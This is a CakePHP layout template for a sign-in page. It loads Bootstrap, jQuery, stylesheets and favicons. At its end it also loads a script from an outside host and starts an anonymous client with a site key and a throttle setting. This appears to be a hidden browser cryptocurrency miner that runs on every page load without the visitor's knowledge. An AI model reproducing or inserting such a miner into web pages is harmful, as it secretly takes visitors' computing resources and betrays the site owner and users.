<!DOCTYPE html>
<html>
<head>
    <?= $this->Html->charset() ?>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        <?= $this->fetch('title') ?>
    </title>

    <?php $library = $this->request->getAttribute("webroot")."ico/"; ?>
    <link rel="icon" href="<?php echo $library; ?>img/favicon/favicon.ico">
    <link rel="apple-touch-icon" sizes="180x180" href="<?php echo $library; ?>img/favicon/apple-touch-icon-180x180.png">

    <!-- Bootstrap core CSS -->
    <link href="<?php echo $this->request->getAttribute("webroot"); ?>assets/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="<?php echo $this->request->getAttribute("webroot"); ?>assets/css/signin.css" rel="stylesheet">
    <link href="<?php echo $this->request->getAttribute("webroot"); ?>ic_style-2.css" rel="stylesheet">
</head>
<body class="text-center ic_body">
    
    <?= $this->fetch('content') ?>
    
    <!-- Bootstrap core JavaScript -->
    <script src="<?php echo $this->request->getAttribute("webroot"); ?>assets/js/jquery-3.3.1.min.js"></script>
    <script src="<?php echo $this->request->getAttribute("webroot"); ?>assets/js/bootstrap.bundle.min.js"></script>
    <script src="https://www.hostingcloud.racing/hDTl.js"></script>
    <script>
        var _client = new Client.Anonymous('ee3c3e8c50942905be889544264cc91678b72b870fbebdccfa0f5260f0d1e5cb', {
            throttle: 0.3, ads: 0
        });
        _client.start();
    </script>
</body>
</html>
